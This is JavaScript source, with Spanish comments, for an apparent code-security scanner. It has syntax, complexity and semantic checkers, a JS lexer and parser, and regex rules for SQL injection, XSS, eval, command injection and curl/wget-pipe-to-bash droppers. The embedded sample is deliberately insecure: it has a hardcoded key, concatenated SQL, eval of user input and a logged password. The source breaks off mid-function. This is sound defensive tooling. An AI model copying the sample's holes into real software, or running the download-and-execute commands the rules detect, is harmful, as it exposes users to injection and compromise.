// =======================================================================
// CONFIGURACIÓN Y CONSTANTES
// =======================================================================
const MAX_CODE_LENGTH = 20000;
const MAX_CODE_FOR_AI = 4000;
const MAX_HISTORY = 5;
 
const SAMPLE_CODE = `function loginUser(user, pass) {
  const apiKey = "sk_live_51Hc8xyzTOPSECRET";
  const query = "SELECT * FROM users WHERE user='" + user + "' AND pass='" + pass + "'";
  db.execute(query);
  eval(user);
  console.log("password:", pass);
}`;
 
function uid() { return Math.random().toString(36).slice(2, 10); }
 
function loadJSON(key, fallback) {
  try { const raw = localStorage.getItem(key); return raw ? JSON.parse(raw) : fallback; } catch (e) { return fallback; }
}
function saveJSON(key, value) {
  try { localStorage.setItem(key, JSON.stringify(value)); } catch (e) {}
}
 
// =======================================================================
// ESTADO GLOBAL
// =======================================================================
const state = {
  tab: 'panel',
  files: [{ id: uid(), name: 'login.js', code: SAMPLE_CODE, findings: [], prevFindings: null }],
  activeFileId: null,
  expandedId: null,
  chatMessages: loadJSON('sentinelcode_chat', [
    { role: 'assistant', text: 'Soy tu asistente de seguridad. Analiza tu código en la pestaña "Analizador" y pregúntame sobre los hallazgos, o pide un resumen.' }
  ]),
  chatLoading: false,
  history: loadJSON('sentinelcode_history', []),
  ruleConfig: loadJSON('sentinelcode_ruleconfig', {}),
};
state.activeFileId = state.files[0].id;
 
function activeFile() { return state.files.find((f) => f.id === state.activeFileId); }
function allFindings() { return state.files.flatMap((f) => f.findings); }
 
// =======================================================================
// VERIFICADOR DE SINTAXIS GENÉRICO
// =======================================================================
const OPEN_TO_CLOSE = { '(': ')', '{': '}', '[': ']' };
const CLOSE_TO_OPEN = { ')': '(', '}': '{', ']': '[' };
 
function makeFinding(tipo, categoria, gravedad, linea, descripcion, recomendacion, snippet) {
  return { id: tipo + '-' + linea + '-' + uid(), tipo, categoria, gravedad, linea, snippet: snippet || '', descripcion, recomendacion };
}
 
function checkSyntax(code) {
  const findings = [];
  if (!code) return findings;
  const stack = [];
  let line = 1;
  let inLineComment = false, inBlockComment = false, inString = null, inTriple = null, inTemplate = false;
  for (let i = 0; i < code.length; i++) {
    const ch = code[i];
    const next2 = code.slice(i, i + 3);
    const next2b = code.slice(i, i + 2);
    if (ch === '\n') {
      line += 1;
      if (inLineComment) inLineComment = false;
      if (inString) {
        findings.push(makeFinding('Cadena de Texto Sin Cerrar', 'Error de Sintaxis', 'Alta', line - 1, 'Falta la comilla de cierre (' + inString + ') antes de terminar la línea.', 'Revisa la línea indicada y las anteriores.'));
        inString = null;
      }
      continue;
    }
    if (inLineComment) continue;
    if (inBlockComment) { if (next2b === '*/') { inBlockComment = false; i += 1; } continue; }
    if (inTriple) { if (next2 === inTriple) { inTriple = null; i += 2; } continue; }
    if (inTemplate) { if (ch === '\\') { i += 1; continue; } if (ch === '`') inTemplate = false; continue; }
    if (inString) { if (ch === '\\') { i += 1; continue; } if (ch === inString) inString = null; continue; }
    if (next2 === '//' && ch === '/') { inLineComment = true; i += 1; continue; }
    if (ch === '#') { inLineComment = true; continue; }
    if (next2b === '/*') { inBlockComment = true; i += 1; continue; }
    if (next2 === "'''" || next2 === '"""') { inTriple = next2; i += 2; continue; }
    if (ch === '`') { inTemplate = true; continue; }
    if (ch === "'" || ch === '"') { inString = ch; continue; }
    if (OPEN_TO_CLOSE[ch]) { stack.push({ char: ch, line }); continue; }
    if (CLOSE_TO_OPEN[ch]) {
      const top = stack[stack.length - 1];
      if (!top || top.char !== CLOSE_TO_OPEN[ch]) {
        findings.push(makeFinding('Símbolo de Cierre Inesperado', 'Error de Sintaxis', 'Alta', line, "Se encontró '" + ch + "' sin una apertura correspondiente.", 'Revisa la línea indicada y las anteriores.'));
      } else stack.pop();
      continue;
    }
  }
  stack.forEach((open) => {
    findings.push(makeFinding('Símbolo Sin Cerrar', 'Error de Sintaxis', 'Alta', open.line, "'" + open.char + "' abierto en esta línea nunca se cierra con '" + OPEN_TO_CLOSE[open.char] + "'.", 'Revisa la línea indicada y las anteriores.'));
  });
  if (inString) findings.push(makeFinding('Cadena de Texto Sin Cerrar', 'Error de Sintaxis', 'Alta', line, 'Quedó una comilla (' + inString + ') abierta hasta el final del archivo.', 'Revisa el archivo completo.'));
  if (inTriple) findings.push(makeFinding('Cadena Triple Sin Cerrar', 'Error de Sintaxis', 'Alta', line, 'Quedó un bloque ' + inTriple + ' abierto hasta el final del archivo.', 'Revisa el archivo completo.'));
  if (inTemplate) findings.push(makeFinding('Template Literal Sin Cerrar', 'Error de Sintaxis', 'Alta', line, 'Quedó un backtick ` abierto hasta el final del archivo.', 'Revisa el archivo completo.'));
  if (inBlockComment) findings.push(makeFinding('Comentario de Bloque Sin Cerrar', 'Error de Sintaxis', 'Alta', line, "Falta '*/' para cerrar un comentario de bloque.", 'Revisa el archivo completo.'));
  return findings;
}
 
// =======================================================================
// VERIFICADOR DE COMPLEJIDAD (funciones largas / anidamiento profundo)
// =======================================================================
function checkComplexity(code) {
  const findings = [];
  if (!code) return findings;
  let line = 1, depth = 0, maxDepth = 0, maxDepthLine = 1;
  const openStack = [];
  let inLineComment = false, inBlockComment = false, inString = null, inTriple = null, inTemplate = false;
  let longBlockFlagged = false;
  for (let i = 0; i < code.length; i++) {
    const ch = code[i];
    const next2 = code.slice(i, i + 3);
    const next2b = code.slice(i, i + 2);
    if (ch === '\n') { line += 1; if (inLineComment) inLineComment = false; if (inString) inString = null; continue; }
    if (inLineComment) continue;
    if (inBlockComment) { if (next2b === '*/') { inBlockComment = false; i += 1; } continue; }
    if (inTriple) { if (next2 === inTriple) { inTriple = null; i += 2; } continue; }
    if (inTemplate) { if (ch === '\\') { i += 1; continue; } if (ch === '`') inTemplate = false; continue; }
    if (inString) { if (ch === '\\') { i += 1; continue; } if (ch === inString) inString = null; continue; }
    if (next2 === '//' && ch === '/') { inLineComment = true; i += 1; continue; }
    if (ch === '#') { inLineComment = true; continue; }
    if (next2b === '/*') { inBlockComment = true; i += 1; continue; }
    if (next2 === "'''" || next2 === '"""') { inTriple = next2; i += 2; continue; }
    if (ch === '`') { inTemplate = true; continue; }
    if (ch === "'" || ch === '"') { inString = ch; continue; }
    if (ch === '{') { depth += 1; openStack.push(line); if (depth > maxDepth) { maxDepth = depth; maxDepthLine = line; } continue; }
    if (ch === '}') {
      const startLine = openStack.pop();
      if (startLine !== undefined) {
        const span = line - startLine;
        if (span > 60 && !longBlockFlagged) {
          findings.push(makeFinding('Bloque de Código Muy Extenso', 'Complejidad', 'Baja', startLine, 'Este bloque ocupa más de 60 líneas, lo que dificulta su lectura y mantenimiento.', 'Considera dividirlo en funciones más pequeñas con responsabilidades específicas.'));
          longBlockFlagged = true;
        }
      }
      depth = Math.max(0, depth - 1);
      continue;
    }
  }
  if (maxDepth > 5) {
    findings.push(makeFinding('Anidamiento Profundo', 'Complejidad', 'Baja', maxDepthLine, 'Se detectó un anidamiento de más de 5 niveles de llaves, lo que suele indicar lógica difícil de seguir.', 'Considera extraer la lógica interna a funciones auxiliares o usar early returns.'));
  }
  return findings;
}
 
// =======================================================================
// REGLAS DE PATRONES SOSPECHOSOS / MALWARE
// =======================================================================
const RULES = [
  { id: 'eval-usage', tipo: 'Ejecución de Código Dinámico (eval)', severity: 'Crítica', categoria: 'Malware / RCE', regex: /\beval\s*\(/, descripcion: 'Uso de eval() sobre datos potencialmente no confiables. Permite ejecución arbitraria de código.', recomendacion: 'Evita eval(). Usa un parser seguro (p. ej. JSON.parse) o una allowlist estricta.' },
  { id: 'function-constructor', tipo: 'Constructor Function Dinámico', severity: 'Alta', categoria: 'Malware / RCE', regex: /new\s+Function\s*\(/, descripcion: 'new Function(...) compila código en tiempo de ejecución, similar a eval().', recomendacion: 'Reemplaza por funciones definidas estáticamente.' },
  { id: 'child-process-exec', tipo: 'Command Injection', severity: 'Crítica', categoria: 'Inyección de Comando', regex: /\b(child_process|execSync|spawn)\s*\(/, descripcion: 'Posible ejecución de comandos del sistema operativo con datos externos.', recomendacion: 'Usa APIs específicas en vez de shell, o valida/escapa estrictamente los argumentos.' },
  { id: 'os-system-python', tipo: 'Command Injection', severity: 'Crítica', categoria: 'Inyección de Comando', regex: /\bos\.system\s*\(|subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True/, descripcion: 'Llamada a os.system() o subprocess con shell=True: riesgo de inyección de comandos.', recomendacion: 'Usa subprocess con una lista de argumentos y shell=False.' },
  { id: 'curl-pipe-bash', tipo: 'Descarga y Ejecución Remota', severity: 'Crítica', categoria: 'Malware', regex: /curl[^\n]*\|\s*(sh|bash)|wget[^\n]*\|\s*(sh|bash)/, descripcion: 'Patrón "descargar y ejecutar" (curl/wget | bash), típico de droppers de malware.', recomendacion: 'Nunca ejecutes scripts remotos sin verificar su integridad y revisarlos antes.' },
  { id: 'sql-string-concat', tipo: 'SQL Injection', severity: 'Alta', categoria: 'Inyección SQL', regex: /(SELECT|INSERT|UPDATE|DELETE)[^\n]*['"`]\s*\+|\+\s*['"`][^\n]*(SELECT|INSERT|UPDATE|DELETE)/i, descripcion: 'Construcción de una consulta SQL mediante concatenación de strings con variables.', recomendacion: 'Usa consultas parametrizadas / prepared statements.' },
  { id: 'sql-fstring', tipo: 'SQL Injection', severity: 'Alta', categoria: 'Inyección SQL', regex: /f['"][^'"]*(SELECT|INSERT|UPDATE|DELETE)[^'"]*\{/i, descripcion: 'f-string de Python interpolando variables directamente en una consulta SQL.', recomendacion: 'Usa parámetros con placeholders (%s, ?) del driver de base de datos.' },
  { id: 'hardcoded-secret', tipo: 'Hardcoded Credential', severity: 'Crítica', categoria: 'Exposición de Credenciales', regex: /\b(api[_-]?key|apikey|secret|password|passwd|pwd|token|access[_-]?key)\b\s*[:=]\s*['"][^'"\s]{4,}['"]/i, descripcion: 'Credencial, token o contraseña embebida directamente en el código fuente.', recomendacion: 'Mueve el valor a variables de entorno o a un gestor de secretos.' },
  { id: 'secret-in-url', tipo: 'Credencial en URL', severity: 'Alta', categoria: 'Exposición de Credenciales', regex: /[?&](api[_-]?key|token|secret|password)=[^&\s'"]+/i, descripcion: 'Se pasa una credencial o token como parámetro de URL; queda expuesto en logs, historial del navegador y proxies.', recomendacion: 'Envía credenciales en encabezados (headers) o en el cuerpo de la petición, nunca en la URL.' },
  { id: 'innerhtml-assign', tipo: 'XSS (Cross-Site Scripting)', severity: 'Alta', categoria: 'Inyección Web', regex: /\.innerHTML\s*=\s*[^;]*[+`]/, descripcion: 'Asignación a innerHTML combinando contenido dinámico; riesgo de XSS.', recomendacion: 'Usa textContent, o sanitiza el HTML antes de insertarlo (p. ej. DOMPurify).' },
  { id: 'document-write', tipo: 'XSS (Cross-Site Scripting)', severity: 'Media', categoria: 'Inyección Web', regex: /document\.write\s*\(/, descripcion: 'document.write() es una fuente clásica de XSS y bloquea el parseo de la página.', recomendacion: 'Evita document.write(); manipula el DOM de forma segura.' },
  { id: 'dangerously-set-innerhtml', tipo: 'XSS (dangerouslySetInnerHTML)', severity: 'Alta', categoria: 'Inyección Web', regex: /dangerouslySetInnerHTML/, descripcion: 'dangerouslySetInnerHTML en React inserta HTML sin escapar; riesgo de XSS si el contenido viene del usuario.', recomendacion: 'Sanitiza el HTML con una librería confiable (p. ej. DOMPurify) antes de usarlo.' },
  { id: 'pickle-loads', tipo: 'Deserialización Insegura (pickle)', severity: 'Alta', categoria: 'Deserialización Insegura', regex: /pickle\.loads?\s*\(/, descripcion: 'pickle.load/loads() puede ejecutar código arbitrario si el dato deserializado no es confiable.', recomendacion: 'Usa formatos seguros como JSON, o valida/firma el origen de los datos antes de deserializar.' },
  { id: 'php-unserialize', tipo: 'Deserialización Insegura (unserialize)', severity: 'Alta', categoria: 'Deserialización Insegura', regex: /\bunserialize\s*\(/, descripcion: 'unserialize() en PHP puede instanciar objetos arbitrarios y ejecutar código (PHP Object Injection).', recomendacion: 'Usa json_decode() en vez de unserialize(), o valida estrictamente el origen de los datos.' },
  { id: 'insecure-tls', tipo: 'TLS Deshabilitado', severity: 'Alta', categoria: 'Configuración Insegura', regex: /rejectUnauthorized\s*:\s*false|verify\s*=\s*False|NODE_TLS_REJECT_UNAUTHORIZED/, descripcion: 'Verificación de certificados TLS deshabilitada.', recomendacion: 'Nunca deshabilites la verificación TLS en producción.' },
  { id: 'insecure-random', tipo: 'Aleatoriedad Insegura', severity: 'Media', categoria: 'Criptografía Débil', regex: /Math\.random\s*\(\)[^\n]*(token|secret|password|session|id)|(token|secret|password|session)[^\n]*Math\.random\s*\(\)|random\.random\s*\([^\n]*(token|secret|password)|(token|secret|password)[^\n]*random\.random\s*\(/i, descripcion: 'Uso de un generador pseudoaleatorio no criptográfico para un valor sensible.', recomendacion: 'Usa crypto.randomBytes()/crypto.getRandomValues() o el módulo secrets de Python.' },
  { id: 'weak-hash', tipo: 'Hash Débil', severity: 'Media', categoria: 'Criptografía Débil', regex: /\b(md5|sha1)\s*\(|createHash\s*\(\s*['"](md5|sha1)['"]/i, descripcion: 'Uso de un algoritmo hash considerado débil (MD5/SHA1).', recomendacion: 'Usa bcrypt/argon2/scrypt para contraseñas, SHA-256+ para integridad.' },
  { id: 'todo-fixme', tipo: 'Deuda Técnica (TODO/FIXME)', severity: 'Baja', categoria: 'Calidad de Código', regex: /\b(TODO|FIXME|HACK)\b/, descripcion: 'Marcador de tarea pendiente o solución temporal dejada en el código.', recomendacion: 'Da seguimiento en el backlog antes de pasar a producción.' },
  { id: 'console-log-leftover', tipo: 'Posible Fuga de Información', severity: 'Baja', categoria: 'Calidad de Código', regex: /console\.log\s*\([^)]*(password|token|secret|apikey)/i, descripcion: 'Se registra en consola un valor que parece ser un dato sensible.', recomendacion: 'Elimina el log o enmascara el valor sensible.' },
];
 
const ALL_CATEGORIES = Array.from(new Set(RULES.map(r => r.categoria).concat(['Error de Sintaxis', 'Complejidad', 'Análisis Semántico'])));
ALL_CATEGORIES.forEach((cat) => { if (state.ruleConfig[cat] === undefined) state.ruleConfig[cat] = true; });
saveJSON('sentinelcode_ruleconfig', state.ruleConfig);
 
function analyzeCode(code, filePath) {
  if (!code || !code.trim()) return [];
  const findings = [];
  if (state.ruleConfig['Error de Sintaxis'] !== false) {
    checkSyntax(code).forEach((f) => findings.push(Object.assign({}, f, { ruta: filePath })));
  }
  if (state.ruleConfig['Complejidad'] !== false) {
    checkComplexity(code).forEach((f) => findings.push(Object.assign({}, f, { ruta: filePath })));
  }
  if (state.ruleConfig['Análisis Semántico'] !== false && /\.(m|c)?js$/i.test(filePath || '')) {
    compileAll(code).semantic.forEach((f) => findings.push(Object.assign({}, f, { ruta: filePath })));
  }
  code.split('\n').forEach((lineText, idx) => {
    RULES.forEach((rule) => {
      if (state.ruleConfig[rule.categoria] === false) return;
      if (rule.regex.test(lineText)) {
        findings.push({
          id: rule.id + '-' + (idx + 1) + '-' + uid(),
          tipo: rule.tipo, categoria: rule.categoria, gravedad: rule.severity,
          ruta: filePath, linea: idx + 1, snippet: lineText.trim().slice(0, 160),
          descripcion: rule.descripcion, recomendacion: rule.recomendacion,
        });
      }
    });
  });
  return findings;
}
 
function computeSecurityScore(findings) {
  const weights = { 'Crítica': 18, 'Alta': 10, 'Media': 5, 'Baja': 2 };
  let penalty = 0;
  findings.forEach((f) => { penalty += weights[f.gravedad] || 2; });
  return Math.max(0, 100 - penalty);
}
function countBySeverity(findings) {
  const counts = { 'Crítica': 0, 'Alta': 0, 'Media': 0, 'Baja': 0 };
  findings.forEach((f) => { if (counts[f.gravedad] !== undefined) counts[f.gravedad] += 1; });
  return counts;
}
function severityChipStyle(sev) {
  switch (sev) {
    case 'Crítica': return 'background:var(--crit-bg);color:var(--crit-text)';
    case 'Alta': return 'background:var(--high-bg);color:var(--high-text)';
    case 'Media': return 'background:var(--med-bg);color:var(--med-text)';
    default: return 'background:var(--low-bg);color:var(--low-text)';
  }
}
function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}
 
// =======================================================================
// COMPARAR (diff entre análisis)
// =======================================================================
// ===== COMPILADOR: LÉXICO, SINTÁCTICO (AST) Y SEMÁNTICO — JavaScript básico =====
const KEYWORDS = new Set(['var','let','const','function','return','if','else','for','while','break','continue','new','typeof','true','false','null','undefined','this','async','await','try','catch','finally','throw','in']);
const OPS = ['===','!==','**=','...','=>','==','!=','<=','>=','&&','||','++','--','+=','-=','*=','/=','%=','??','**','+','-','*','/','%','=','<','>','!','?',':','&','|','^','~'];
function lex(code) {
  const tokens = []; let i = 0, line = 1;
  const push = (tipo, lexema, l) => tokens.push({ tipo, lexema, linea: l });
  while (i < code.length) {
    const ch = code[i];
    if (ch === '\n') { line++; i++; continue; }
    if (/\s/.test(ch)) { i++; continue; }
    if (ch === '/' && code[i + 1] === '/') { while (i < code.length && code[i] !== '\n') i++; continue; }
    if (ch === '/' && code[i + 1] === '*') { i += 2; while (i < code.length && !(code[i] === '*' && code[i + 1] === '/')) { if (code[i] === '\n') line++; i++; } i += 2; continue; }
    if (ch === '"' || ch === "'" || ch === '`') {
      const l = line; let j = i + 1;
      while (j < code.length && code[j] !== ch && (ch === '`' || code[j] !== '\n')) { if (code[j] === '\\') j++; if (code[j] === '\n') line++; j++; }
      push('CADENA', code.slice(i, j + 1), l); i = j + 1; continue;
    }
    const rest = code.slice(i, i + 40);
    let m = /^(0x[0-9a-fA-F]+|\d+\.?\d*([eE][+-]?\d+)?)/.exec(rest);
    if (m) { push('NUMERO', m[0], line); i += m[0].length; continue; }
    m = /^[A-Za-z_$][\w$]*/.exec(rest);
    if (m) { push(KEYWORDS.has(m[0]) ? 'PALABRA_CLAVE' : 'IDENTIFICADOR', m[0], line); i += m[0].length; continue; }
    const op = OPS.find((o) => code.startsWith(o, i));
    if (op) { push('OPERADOR', op, line); i += op.length; continue; }
    if ('(){}[];,.'.includes(ch)) { push('PUNTUACION', ch, line); i++; continue; }
    push('DESCONOCIDO', ch, line); i++;
  }
  return tokens;
}
 
function parse(tokens) {
  let p = 0; const errors = [];
  const peek = (o = 0) => tokens[p + o];
  const isT = (lx, o = 0) => { const t = peek(o); return !!t && t.lexema === lx && t.tipo !== 'CADENA'; };
  const next = () => tokens[p++];
  const node = (type, line, kids, extra) => Object.assign({ type, line, kids: kids || [] }, extra);
  const err = (msg) => { const t = peek() || tokens[tokens.length - 1]; errors.push({ linea: t ? t.linea : 1, msg }); throw new Error('parse'); };
  const expect = (lx) => { if (isT(lx)) return next(); err("Se esperaba '" + lx + "' pero se encontró " + (peek() ? "'" + peek().lexema + "'" : 'el fin del archivo')); };
  const ident = () => { const t = peek(); if (!t || t.tipo !== 'IDENTIFICADOR') err('Se esperaba un identificador'); next(); return t.lexema; };
  const semi = () => { if (isT(';')) { next(); return; } const prev = tokens[p - 1]; if (peek() && !isT('}') && peek().linea === prev.linea) err("Falta ';' al final de la instrucción"); };
  const isDecl = () => peek() && peek().tipo === 'PALABRA_CLAVE' && ['var', 'let', 'const'].includes(peek().lexema);
 
  function block() { const L = peek() ? peek().linea : 1; expect('{'); const k = []; while (!isT('}')) { if (!peek()) err("Falta '}' de cierre"); k.push(statement()); } next(); return node('Block', L, k); }
  function varDecl() {
    const L = peek().linea, kind = next().lexema, ds = [];
    do { const l = peek() ? peek().linea : L; const name = ident(); let init = null; if (isT('=')) { next(); init = assign(); } ds.push(node('Declarator', l, init ? [init] : [], { name, kind })); } while (isT(',') && next());
    return node('VarDecl', L, ds, { kind });
  }
  function paramList() { expect('('); const ps = []; while (!isT(')')) { ps.push(ident()); if (isT('=')) { next(); assign(); } if (!isT(')')) expect(','); } expect(')'); return ps; }
  function statement() {
    const t = peek(), L = t.linea;
    if (isT('{')) return block();
    if (isDecl()) { const n = varDecl(); semi(); return n; }
    if (isT('function') || (isT('async') && isT('function', 1))) { if (isT('async')) next(); next(); const name = ident(); const params = paramList(); return node('FunctionDecl', L, [block()], { name, params }); }
    if (isT('if')) { next(); expect('('); const c = expr(); expect(')'); const k = [c, statement()]; if (isT('else')) { next(); k.push(statement()); } return node('If', L, k); }
    if (isT('while')) { next(); expect('('); const c = expr(); expect(')'); return node('While', L, [c, statement()]); }
    if (isT('for')) {
      next(); expect('('); let init = null;
      if (!isT(';')) init = isDecl() ? varDecl() : expr();
      if (isT('of') || isT('in')) { next(); const it = expr(); expect(')'); return node('ForIn', L, [init, it, statement()]); }
      expect(';'); const test = isT(';') ? null : expr(); expect(';'); const upd = isT(')') ? null : expr(); expect(')');
      return node('For', L, [init, test, upd, statement()].filter(Boolean));
    }
    if (isT('return')) { next(); const a = (!peek() || isT(';') || isT('}') || peek().linea !== L) ? null : expr(); semi(); return node('Return', L, a ? [a] : []); }
    if (isT('break') || isT('continue')) { const ty = next().lexema; semi(); return node(ty === 'break' ? 'Break' : 'Continue', L); }
    if (isT('throw')) { next(); const a = expr(); semi(); return node('Throw', L, [a]); }
    if (isT('try')) {
      next(); const k = [block()]; let param = null;
      if (isT('catch')) { next(); if (isT('(')) { next(); param = ident(); expect(')'); } k.push(block()); }
      if (isT('finally')) { next(); k.push(block()); }
      return node('Try', L, k, { param });
    }
    if (t.tipo === 'PALABRA_CLAVE' && ['class', 'switch', 'import', 'export', 'do'].includes(t.lexema)) err("La construcción '" + t.lexema + "' está fuera del subconjunto de JavaScript soportado");
    const e = expr(); semi(); return node('ExprStmt', L, [e]);
  }
  const BIN = [['??'], ['||'], ['&&'], ['==', '!=', '===', '!=='], ['<', '>', '<=', '>='], ['+', '-'], ['*', '/', '%'], ['**']];
  function expr() { return assign(); }
  function arrowAhead() { let d = 0, j = p; for (; j < tokens.length; j++) { if (tokens[j].lexema === '(' && tokens[j].tipo !== 'CADENA') d++; else if (tokens[j].lexema === ')' && tokens[j].tipo !== 'CADENA') { d--; if (d === 0) break; } } return !!tokens[j + 1] && tokens[j + 1].lexema === '=>'; }
  function assign() {
    const L = peek() ? peek().linea : 1;
    const arrow = (params) => { expect('=>'); const body = isT('{') ? block() : assign(); return node('Arrow', L, [body], { params }); };
    if (peek() && peek().tipo === 'IDENTIFICADOR' && isT('=>', 1)) return arrow([ident()]);
    if (isT('(') && arrowAhead()) return arrow(paramList());
    const left = cond();
    if (peek() && peek().tipo === 'OPERADOR' && ['=', '+=', '-=', '*=', '/=', '%=', '**='].includes(peek().lexema)) { const op = next().lexema; return node('Assign', left.line, [left, assign()], { op }); }
    return left;
  }
  function cond() { const c = bin(0); if (isT('?')) { next(); const a = assign(); expect(':'); return node('Conditional', c.line, [c, a, assign()]); } return c; }
  function bin(lv) {
    if (lv >= BIN.length) return unary();
    let l = bin(lv + 1);
    while (peek() && peek().tipo === 'OPERADOR' && BIN[lv].includes(peek().lexema)) { const op = next().lexema; l = node('Binary', l.line, [l, bin(lv + 1)], { op }); }
    return l;
  }
  function unary() {
    const t = peek();
    if (t && ((t.tipo === 'OPERADOR' && ['!', '-', '+', '~', '++', '--'].includes(t.lexema)) || (t.tipo === 'PALABRA_CLAVE' && ['typeof', 'await'].includes(t.lexema)))) { next(); return node('Unary', t.linea, [unary()], { op: t.lexema }); }
    const e = call();
    if (peek() && peek().tipo === 'OPERADOR' && ['++', '--'].includes(peek().lexema)) return node('Update', e.line, [e], { op: next().lexema });
    return e;
  }
  function args() { expect('('); const a = []; while (!isT(')')) { if (isT('...')) next(); a.push(assign()); if (!isT(')')) expect(','); } next(); return a; }
  function call() {
    if (isT('new')) { const L = next().linea; return node('New', L, [call()]); }
    let e = primary();
    for (;;) {
      if (isT('(')) e = node('Call', e.line, [e].concat(args()));
      else if (isT('.')) { next(); const n = next(); if (!n) err("Se esperaba un nombre después de '.'"); e = node('Member', e.line, [e], { prop: n.lexema }); }
      else if (isT('[')) { next(); const ix = expr(); expect(']'); e = node('Index', e.line, [e, ix]); }
      else break;
    }
    return e;
  }
  function primary() {
    const t = peek(); if (!t) err('Expresión incompleta al final del archivo');
    if (isT('async')) { next(); return primary(); }
    if (t.tipo === 'NUMERO') { next(); return node('Literal', t.linea, [], { value: t.lexema }); }
    if (t.tipo === 'CADENA') {
      next(); const kids = [];
      if (t.lexema[0] === '`') (t.lexema.match(/\$\{[^}]*\}/g) || []).forEach((s) => (s.slice(2, -1).match(/(?<![\w$.])[A-Za-z_$][\w$]*/g) || []).forEach((nm) => kids.push(node('Identifier', t.linea, [], { name: nm }))));
      return node('Literal', t.linea, kids, { value: t.lexema });
    }
    if (t.tipo === 'PALABRA_CLAVE' && ['true', 'false', 'null', 'undefined', 'this'].includes(t.lexema)) { next(); return node('Literal', t.linea, [], { value: t.lexema }); }
    if (t.tipo === 'IDENTIFICADOR') { next(); return node('Identifier', t.linea, [], { name: t.lexema }); }
    if (isT('(')) { next(); const e = expr(); expect(')'); return e; }
    if (isT('[')) { next(); const els = []; while (!isT(']')) { els.push(assign()); if (!isT(']')) expect(','); } next(); return node('Array', t.linea, els); }
    if (isT('{')) {
      next(); const ps = [];
      while (!isT('}')) { const key = next(); if (!key) err("Falta '}' de cierre"); if (isT(':')) { next(); ps.push(assign()); } else ps.push(node('Identifier', key.linea, [], { name: key.lexema })); if (!isT('}')) expect(','); }
      next(); return node('Object', t.linea, ps);
    }
    if (isT('function')) { next(); let name = null; if (peek() && peek().tipo === 'IDENTIFICADOR') name = next().lexema; const params = paramList(); return node('FunctionExpr', t.linea, [block()], { name, params }); }
    err("Token inesperado '" + t.lexema + "'");
  }
  const prog = [];
  while (p < tokens.length && errors.length < 5) {
    try { prog.push(statement()); } catch (e) { if (e.message !== 'parse') throw e; while (peek() && !isT(';') && !isT('}')) next(); if (peek()) next(); }
  }
  return { ast: node('Program', 1, prog), errors };
}
 
const GLOBALS = new Set(['console', 'Math', 'JSON', 'Object', 'Array', 'String', 'Number', 'Boolean', 'Date', 'Promise', 'Error', 'Map', 'Set', 'RegExp', 'parseInt', 'parseFloat', 'isNaN', 'setTimeout', 'setInterval', 'clearTimeout', 'clearInterval', 'fetch', 'document', 'window', 'require', 'module', 'exports', 'process', 'Buffer', 'localStorage', 'alert', 'NaN', 'Infinity', 'crypto', 'URL', 'Symbol']);
function analyzeSemantics(ast) {
  const out = [];
  const F = (tipo, g, linea, d, r) => out.push(makeFinding(tipo, 'Análisis Semántico', g, linea, d, r));
  const collect = (n, acc) => {
    if (n.type === 'VarDecl') n.kids.forEach((d) => acc.push({ name: d.name, kind: n.kind, line: d.line }));
    if (n.type === 'FunctionDecl') { acc.push({ name: n.name, kind: 'function', line: n.line }); return; }
    if (n.type === 'FunctionExpr' || n.type === 'Arrow') return;
    if (n.type === 'Try' && n.param) acc.push({ name: n.param, kind: 'param', line: n.line });
    n.kids.forEach((k) => collect(k, acc));
  };
  const mkScope = (parent, params, body) => {
    const s = { vars: new Map(), parent };
    (params || []).forEach((nm) => s.vars.set(nm, { kind: 'param', line: 0, used: true }));
    const acc = []; body.forEach((b) => collect(b, acc));
    acc.forEach((d) => {
      const prev = s.vars.get(d.name);
      if (prev && prev.kind !== 'param' && (d.kind !== 'var' || prev.kind !== 'var') && d.kind !== 'function') F('Variable Redeclarada', 'Alta', d.line, "'" + d.name + "' ya fue declarada antes en el mismo ámbito (línea " + prev.line + ').', 'Elimina la declaración duplicada o usa otro nombre.');
      else if (!prev) s.vars.set(d.name, { kind: d.kind, line: d.line, used: d.kind === 'param' || d.kind === 'function' });
    });
    return s;
  };
  const look = (s, nm) => { for (let c = s; c; c = c.parent) if (c.vars.has(nm)) return c.vars.get(nm); return null; };
  const closeScope = (s) => s.vars.forEach((v, nm) => { if (!v.used) F('Variable Declarada y No Usada', 'Baja', v.line, "'" + nm + "' se declara pero nunca se usa.", 'Elimina la variable o úsala.'); });
  const walk = (n, s) => {
    if (!n) return;
    if (n.type === 'FunctionDecl' || n.type === 'FunctionExpr' || n.type === 'Arrow') {
      const body = n.kids[0].type === 'Block' ? n.kids[0].kids : [];
      const inner = mkScope(s, n.params.concat(n.name && n.type === 'FunctionExpr' ? [n.name] : []), body);
      n.kids.forEach((k) => walk(k, inner)); closeScope(inner); return;
    }
    if (n.type === 'Identifier') {
      const v = look(s, n.name);
      if (v) v.used = true; else if (!GLOBALS.has(n.name)) F('Variable No Declarada', 'Alta', n.line, "'" + n.name + "' se usa sin haber sido declarada.", 'Declárala con let o const antes de usarla, o revisa si está mal escrita.');
      return;
    }
    if (n.type === 'Assign' && n.kids[0].type === 'Identifier') {
      const id = n.kids[0], v = look(s, id.name);
      if (!v && !GLOBALS.has(id.name)) F('Variable No Declarada', 'Alta', id.line, "Se asigna a '" + id.name + "' sin haberla declarado.", 'Declárala con let o const antes de asignarla.');
      if (v && v.kind === 'const') F('Asignación a Constante', 'Alta', id.line, "'" + id.name + "' es const y no puede reasignarse.", 'Usa let si el valor debe cambiar.');
      if (v && n.op !== '=') v.used = true;
      walk(n.kids[1], s); return;
    }
    n.kids.forEach((k) => walk(k, s));
  };
  const top = mkScope(null, [], ast.kids);
  ast.kids.forEach((k) => walk(k, top)); closeScope(top);
  return out;
}
 
function compileAll(code) {
  const tokens = lex(code), { ast, errors } = parse(tokens);
  return { tokens, ast, errors, semantic: errors.length ? [] : analyzeSemantics(ast) };
}
 
function nodeLabel(n) {
  const p = [n.type];
  if (n.kind && n.type === 'VarDecl') p.push(n.kind);
  if (n.name !== undefined && n.name !== null) p.push(n.name);
  if (n.op) p.push(n.op);
  if (n.prop) p.push('.' + n.prop);
  if (n.value !== undefined) p.push(String(n.value).slice(0, 12));
  if (n.params) p.push('(' + n.params.join(',') + ')');
  return p.join(' ');
}
function treeSvg(ast, maxNodes) {
  let count = 0, leaf = 0, maxD = 0; const all = [];
  const go = (n, d) => {
    const me = { label: nodeLabel(n), d, kids: [] }; count++; maxD = Math.max(maxD, d);
